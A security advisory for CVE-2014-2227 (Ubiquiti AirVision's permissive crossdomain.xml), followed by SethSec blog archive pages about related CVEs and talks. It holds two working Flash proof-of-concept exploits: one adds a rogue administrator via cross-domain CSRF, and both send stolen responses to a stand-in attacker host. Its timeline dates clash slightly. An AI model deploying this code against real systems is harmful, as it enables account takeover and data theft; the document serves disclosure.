POC #1: Using crossdomain.xml to execute CSRF and add an  administrator:
------------------------------------------------------------------------------------------------------

// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github:
(<https://github.com/gursev/flash-xdomain-xploit>)
package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;
 import flash.net.URLRequestHeader;

 public class XDomainXploit3 extends Sprite {
  public function XDomainXploit3() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "https//victim:7443/api/2.0/admin";
   var header:URLRequestHeader = new URLRequestHeader("Content-Type",
"text/plain; charset=UTF-8");
   var readRequest:URLRequest = new URLRequest(readFrom);
   readRequest.method = URLRequestMethod.POST
   readRequest.data =
"{\"name\":\"csrf-cdp\",\"email\":\"csrf-cdp () gmail
com\",\"userGroup\":\"admin\",\"x_password\":\"password\",\"confirmPassword\":\"password\",\"disabled\":false}";
   readRequest.requestHeaders.push(header);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }

  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "[http://www.malicious-site.com/crossdomain/store.php"](http://www.malicious-site.com/crossdomain/store.php%22);
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

-----------------------------------------------------------------------
POC #2: Using crossdomain.xml to exfiltrate log data:
-----------------------------------------------------------------------

// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github:
(<https://github.com/gursev/flash-xdomain-xploit>)
package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class XDomainXploit extends Sprite {
  public function XDomainXploit() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "/victim:7443/api/2.0/admin";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }

  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "[http://www.malicious-site.com/admin"](http://www.malicious-site.com/admin%22);
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

-------------
Solution:
-------------
AirVision Controller - Upgrade to UniFi Video v3.0.1 or greater (Note:
The application name changed from AirVision to UniFi Video)

-----------------------------
Disclosure Timeline:
-----------------------------

2014-02-25: Notified Ubiquiti of crossdomain vulnerability in AirVision product
2014-02-19: Ubiquti confirms receipt of AirVision report and existence
of the vulnerability
2014-02-28: CVE-2014-2227 assigned
2014-03-12: Requested status update
2014-03-27: Requested status update
2014-04-07: Requested status update
2014-04-09: Ubiquiti provides timeline for solution
2014-04-18: UniFi Video 3.0.1 is released
2014-06-13: Set public disclosure date of 2014-07-24
2014-07-24: Public disclosure

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](127)
[By Date](date.html#128)
[![Next](/images/right-icon-16x16.png)](129)

[![Previous](/images/left-icon-16x16.png)](127)
[By Thread](index.html#128)
[![Next](/images/right-icon-16x16.png)](130)

### Current thread:

* **CVE-2014-2227: Ubiquiti Networks - AirVision v2.1.3 - Overly Permissive default crossdomain.xml** *Seth Art (Jul 24)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from sethsec.blogspot.com_95e26f1a_20250126_104318.html ===

[Skip to main content](#main)

### Search This Blog

# [SethSec](https://sethsec.blogspot.com/)

### Pages

* [Home](https://sethsec.blogspot.com/)
* [About](https://sethsec.blogspot.com/p/about.html)

More…

## Posts

Showing posts from July, 2014

[Show all](https://sethsec.blogspot.com/)

### [CVE-2014-2227](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html "permanent link")

![Image](https://lh3.googleusercontent.com/L9EZPENjUAo8DKZCtd4x3_IwEO6xcBb2k-NaebevoLACzHy8s88Pu3IWrSkHFVhfiemS4Wzuv7eKc5cdCO26Vij3Z0zb6JBIsFFMWcXCjpf1YZFkq-1Vl-k7K_mxYH3j02o2km1tgqc)

This CVE covers a vulnerability found in the Ubiquiti Networks AirVision application.  For more background on this particular vulnerability, check out this post: Exploiting misconfigured crossdomain.xml files In fact, I wrote that first crossdomain.xml blog post after finding this AirVision vulnerability back in February.  If you already read that post, you should recognize the vulnerable form I use for the POC here (adding an administrator), is the same one I used earlier. Here is a cleaned up version of what I sent to Ubiquiti back in February: AirVision Controller v2.1.3 - Overly Permissive default crossdomain.xml CWE-264: http://cwe.mitre.org/data/definitions/264.html Misuse Case If the victim user is authenticated with their AirVision Controller, and they visit a malicious site, the owner of the malicious site can make changes to, and read data from, the AirVision Controller. The malicious site can even add a new administrative user accou...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/2467150705887262503)

[Read more](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html "CVE-2014-2227")

### [CVE-2014-2226](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html "permanent link")

![Image](https://lh4.googleusercontent.com/0mbDkx7JP6QtDKphoCV8GUyOmvXsF727etC4W-ONes_XLUwRgOZ8z4TwYAdFUYAmWgJkgSe19uzavb6aoa2GlB-nv0iQHb4zFMjvUTd-G4iDQEVlxvxXenQyEvzC6TSnHZAXp3NgHl4)

Ubiquiti - UniFi Controller - Admin/root password hash sent via syslog CWE-310: http://cwe.mitre.org/data/definitions/310.html Misuse case: An attacker who has access to network traffic between the UniFi controller and the configured syslog server, can retrieve the password hash and use it to access all managed access points, and potentially the UniFi controller as well.   Details:   If remote logging is enabled on the UniFi controller, the controller sends syslog messages to the configured syslog server. Contained within the syslog messages is the admin password hash that is used by both the UniFi controller, and all managed Access Points. In the screenshot below, the auth key and the encrypted password are highlighted in yellow. The password is encrypted using the legacy crypt(1) utility, which uses Traditional DES [128/128 BS SSE2], and can be recovered using John the Ripper: Note: The salt (and hash) changes each time the message is s...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/7006622851642190540)

[Read more](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html "CVE-2014-2226")

### [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[July 23, 2014](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "permanent link")

![Image](https://lh4.googleusercontent.com/jUQ5YRvJRPdgEedzXqoF_zaEne2nXRH3Ul9KKiFAIh8rZu0xcPdE7Gb-n7_869b6UMOgrxaWxncd0CHR8od0Vwk-LNA6u62W_jtQ1lBXMGzAFWV4ggZEuDrM7-A_z6fNfulA2q66Rrs)

This CVE covers three separate Ubiquiti Networks applications that are all vulnerable to CSRF: UniFi Controller mFi Controller AirVision Controller Ubiquiti - UniFi Controller v2.4.6 - Cross-site Request Forgery (CSRF) CWE-352: http://cwe.mitre.org/data/definitions/352.html The UniFi application is vulnerable to CSRF in multiple locations.  The CWE link above has a great summary of the vulnerability.  In the POC below, I demonstrate how an unauthenticated attacker can send a malicious hyperlink to an authenticated administrator, and how if the administrator clicks on the link, the attacker can force the authenticated administrator to perform quite a few actions without knowing it.  The most serious POC involves the attacker causing the administrator to create a second administrator account.  The attacker can now log into the Unifi controller with this second account (if they have network access to the Unifi controller), and perform any actions that a...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/2257454355096534557)

[Read more](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html "CVE-2014-2225")

[More posts](https://sethsec.blogspot.com/search?updated-max=2014-07-23T23:35:00-04:00&max-results=7 "More posts")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)

    - [CVE-2014-2227](https://sethsec.blogspot.com/2014/07/cve-2014-2227.html)
    - [CVE-2014-2226](https://sethsec.blogspot.com/2014/07/cve-2014-2226.html)
    - [CVE-2014-2225](https://sethsec.blogspot.com/2014/07/cve-2014-2225.html)
    - [Real world exploitation of a misconfigured crossdo...](https://sethsec.blogspot.com/2014/07/crossdomain-bing.html)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)



=== Content from sethsec.blogspot.com_9dfe2c0e_20250126_104321.html ===

[Skip to main content](#main)

### Search This Blog

# [SethSec](https://sethsec.blogspot.com/)

### Pages

* [Home](https://sethsec.blogspot.com/)
* [About](https://sethsec.blogspot.com/p/about.html)

More…

## Posts

Showing posts from October, 2014

[Show all](https://sethsec.blogspot.com/)

### [BSidesDC 2014](https://sethsec.blogspot.com/2014/10/bsidesdc-2014.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[October 28, 2014](https://sethsec.blogspot.com/2014/10/bsidesdc-2014.html "permanent link")

![Image](https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_vrlyp8VJYxaHgwgWngwIu6zv52PXTsFGUjQ_zec0gnwgQbI9vAT5jQTJSh_yxf7WaLiDX22_9IHgiSoZYzHrq2MCKij0875CnnvJdpfYty7b66)

Presenting at BSidesDC was an amazing experience. I feel so lucky that we have our very own local con, and I am extremely grateful to the organizing committee and other volunteers who make this event happen. This is very similar to my DerbyCon talk, however it is 20 minutes longer which gave me time to walk through how to go from finding this vulnerability to exploiting it, including showing the audience how to create a POC SWF.  Also, I released SWF-Server, which will give you everything you need to create your own SWF to exploit this vulnerability. Download the project here: https://github.com/sethsec/crossdomain-exploitation-framework

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/780757234283062055)

[Read more](https://sethsec.blogspot.com/2014/10/bsidesdc-2014.html "BSidesDC 2014")

### [DerbyCon 4.0 - SWF Seeking Lazy Admin for Cross Domain Action](https://sethsec.blogspot.com/2014/10/derbycon-40-swf-seeking-lazy-admin-for.html)

* Get link
* Facebook
* X
* Pinterest
* Email
* Other Apps

-

[October 10, 2014](https://sethsec.blogspot.com/2014/10/derbycon-40-swf-seeking-lazy-admin-for.html "permanent link")

![Image](https://lh3.googleusercontent.com/blogger_img_proxy/AEn0k_tw5VnqXAFS_YW8du2C6f5Ybs9Qb9IEj_wJO5j_lawEIp5G4ovA7u3Mn0jv6LssT4-Gc2acPCBEmnWehz_t8e-mYJ2mVaO9S_Id11D3PYWZkSBl)

Abstract: Security misconfiguration is #5 on the OWASP 2013 Top 10. This talk shows how the misconfiguration of one file can compromise the security of an entire web application. In the talk, youll be introduced to the crossdomain.xml file.  This file determines how third party Flash Objects (SWFs) hosted on other domains can interact with your domain. Unfortunately, this file requires manual configuration on the part of the administrator, and as we all know, when manual configuration is required, mistakes happen.Sometimes, administrators give up and whitelist the entire internet in order to "make it work". This is essentially like adding an "accept all" rule on your firewall or setting your password to <blank>.  We will review how to identify the vulnerability, how to abuse it, and how to write your own SWFs that exploit the flaw. Examples of public sites that until recently contained this vulnerability will be provided, including a few from the Alexa ...

[Post a Comment](https://www.blogger.com/comment/fullpage/post/5890567984672491244/2180295485450784237)

[Read more](https://sethsec.blogspot.com/2014/10/derbycon-40-swf-seeking-lazy-admin-for.html "DerbyCon 4.0 - SWF Seeking Lazy Admin for Cross Domain Action")

[More posts](https://sethsec.blogspot.com/search?updated-max=2014-10-10T15:41:00-04:00&max-results=7 "More posts")

[Powered by Blogger](https://www.blogger.com)

Theme images by [Michael Elkan](http://www.offset.com/photos/394244)

### Archive

* [2022
  1](https://sethsec.blogspot.com/2022/)

  + [December
    1](https://sethsec.blogspot.com/2022/12/)

* [2017
  4](https://sethsec.blogspot.com/2017/)

  + [August
    1](https://sethsec.blogspot.com/2017/08/)
  + [June
    1](https://sethsec.blogspot.com/2017/06/)
  + [May
    2](https://sethsec.blogspot.com/2017/05/)
* [2016
  1](https://sethsec.blogspot.com/2016/)

  + [November
    1](https://sethsec.blogspot.com/2016/11/)
* [2015
  1](https://sethsec.blogspot.com/2015/)

  + [December
    1](https://sethsec.blogspot.com/2015/12/)
* [2014
  13](https://sethsec.blogspot.com/2014/)

  + [December
    1](https://sethsec.blogspot.com/2014/12/)
  + [November
    1](https://sethsec.blogspot.com/2014/11/)
  + [October
    2](https://sethsec.blogspot.com/2014/10/)

    - [BSidesDC 2014](https://sethsec.blogspot.com/2014/10/bsidesdc-2014.html)
    - [DerbyCon 4.0 - SWF Seeking Lazy Admin for Cross Do...](https://sethsec.blogspot.com/2014/10/derbycon-40-swf-seeking-lazy-admin-for.html)
  + [July
    4](https://sethsec.blogspot.com/2014/07/)
  + [March
    2](https://sethsec.blogspot.com/2014/03/)
  + [January
    3](https://sethsec.blogspot.com/2014/01/)
* [2009
  1](https://sethsec.blogspot.com/2009/)

  + [October
    1](https://sethsec.blogspot.com/2009/10/)
* [2008
  5](https://sethsec.blogspot.com/2008/)

  + [June
    2](https://sethsec.blogspot.com/2008/06/)
  + [February
    2](https://sethsec.blogspot.com/2008/02/)
  + [January
    1](https://sethsec.blogspot.com/2008/01/)

Show more
Show less

### Labels

* [A1-Injection](https://sethsec.blogspot.com/search/label/A1-Injection)
* [ActionScript](https://sethsec.blogspot.com/search/label/ActionScript)
* [Active Directory](https://sethsec.blogspot.com/search/label/Active%20Directory)
* [Arris](https://sethsec.blogspot.com/search/label/Arris)
* [ASLA](https://sethsec.blogspot.com/search/label/ASLA)
* [attack](https://sethsec.blogspot.com/search/label/attack)
* [AWS](https://sethsec.blogspot.com/search/label/AWS)
* [Azure](https://sethsec.blogspot.com/search/label/Azure)
* [bash](https://sethsec.blogspot.com/search/label/bash)
* [bash\_profile](https://sethsec.blogspot.com/search/label/bash_profile)

* [bond](https://sethsec.blogspot.com/search/label/bond)
* [bridge](https://sethsec.blogspot.com/search/label/bridge)
* [Burp](https://sethsec.blogspot.com/search/label/Burp)
* [Burp Extensions](https://sethsec.blogspot.com/search/label/Burp%20Extensions)
* [Burp Pro](https://sethsec.blogspot.com/search/label/Burp%20Pro)
* [BurpSuite](https://sethsec.blogspot.com/search/label/BurpSuite)
* [bWAPP](https://sethsec.blogspot.com/search/label/bWAPP)
* [Citrix Xen](https://sethsec.blogspot.com/search/label/Citrix%20Xen)
* [Cloud](https://sethsec.blogspot.com/search/label/Cloud)
* [Cloud Security](https://sethsec.blogspot.com/search/label/Cloud%20Security)
* [CloudSec](https://sethsec.blogspot.com/search/label/CloudSec)
* [Collect](https://sethsec.blogspot.com/search/label/Collect)
* [crossdomain.xml](https://sethsec.blogspot.com/search/label/crossdomain.xml)
* [CSRF](https://sethsec.blogspot.com/search/label/CSRF)
* [CVE-2014-5437](https://sethsec.blogspot.com/search/label/CVE-2014-5437)
* [CVE-2014-5438](https://sethsec.blogspot.com/search/label/CVE-2014-5438)
* [CWE-441](https://sethsec.blogspot.com/search/label/CWE-441)
* [CWE-918](https://sethsec.blogspot.com/search/label/CWE-918)
* [drupal](https://sethsec.blogspot.com/search/label/drupal)
* [EC2](https://sethsec.blogspot.com/search/label/EC2)
* [eval](https://sethsec.blogspot.com/search/label/eval)
* [exploit](https://sethsec.blogspot.com/search/label/exploit)
* [External service interaction](https://sethsec.blogspot.com/search/label/External%20service%20interaction)
* [Flash](https://sethsec.blogspot.com/search/label/Flash)
* [gallery](https://sethsec.blogspot.com/search/label/gallery)
* [GCP](https://sethsec.blogspot.com/search/label/GCP)
* [interface](https://sethsec.blogspot.com/search/label/interface)
* [Kerberos](https://sethsec.blogspot.com/search/label/Kerberos)
* [lirc](https://sethsec.blogspot.com/search/label/lirc)
* [login-CSRF](https://sethsec.blogspot.com/search/label/login-CSRF)
* [multi-stage CSRF](https://sethsec.blogspot.com/search/label/multi-stage%20CSRF)
* [mysql](https://sethsec.blogspot.com/search/label/mysql)
* [MythTV](https://sethsec.blogspot.com/search/label/MythTV)
* [network TAP](https://sethsec.blogspot.com/search/label/network%20TAP)
* [nsm](https://sethsec.blogspot.com/search/label/nsm)
* [Offensive Security](https://sethsec.blogspot.com/search/label/Offensive%20Security)
* [Out-of-band resource load](https://sethsec.blogspot.com/search/label/Out-of-band%20resource%20load)
* [Penetration Testing](https://sethsec.blogspot.com/search/label/Penetration%20Testing)
* [Pentest Lab](https://sethsec.blogspot.com/search/label/Pentest%20Lab)
* [Photos](https://sethsec.blogspot.com/search/label/Photos)
* [Pictures](https://sethsec.blogspot.com/search/label/Pictures)
* [POC](https://sethsec.blogspot.com/search/label/POC)
* [Proxmox](https://sethsec.blogspot.com/search/label/Proxmox)
* [pvr-150](https://sethsec.blogspot.com/search/label/pvr-150)
* [Python](https://sethsec.blogspot.com/search/label/Python)
* [Python Code Injection](https://sethsec.blogspot.com/search/label/Python%20Code%20Injection)
* [RAID5](https://sethsec.blogspot.com/search/label/RAID5)
* [scripting](https://sethsec.blogspot.com/search/label/scripting)
* [security onion](https://sethsec.blogspot.com/search/label/security%20onion)
* [Server-Side Request Forgery](https://sethsec.blogspot.com/search/label/Server-Side%20Request%20Forgery)
* [Share](https://sethsec.blogspot.com/search/label/Share)
* [snort](https://sethsec.blogspot.com/search/label/snort)
* [so](https://sethsec.blogspot.com/search/label/so)
* [SPDIF](https://sethsec.blogspot.com/search/label/SPDIF)
* [SPN](https://sethsec.blogspot.com/search/label/SPN)
* [SSRF](https://sethsec.blogspot.com/search/label/SSRF)
* [SWF](https://sethsec.blogspot.com/search/label/SWF)
* [Ubiquiti](https://sethsec.blogspot.com/search/label/Ubiquiti)
* [ubuntu](https://sethsec.blogspot.com/search/label/ubuntu)
* [VMware](https://sethsec.blogspot.com/search/label/VMware)
* [vulnerability](https://sethsec.blogspot.com/search/label/vulnerability)
* [Web Application](https://sethsec.blogspot.com/search/label/Web%20Application)
* [Wedding](https://sethsec.blogspot.com/search/label/Wedding)
* [WIndows 10](https://sethsec.blogspot.com/search/label/WIndows%2010)
* [Windows Server 2012r2](https://sethsec.blogspot.com/search/label/Windows%20Server%202012r2)
* [Windows Server 2016](https://sethsec.blogspot.com/search/label/Windows%20Server%202016)
* [XFS ASLA](https://sethsec.blogspot.com/search/label/XFS%20ASLA)
* [XSPA](https://sethsec.blogspot.com/search/label/XSPA)

Show more
Show less

### [Report Abuse](https://www.blogger.com/go/report-abuse)


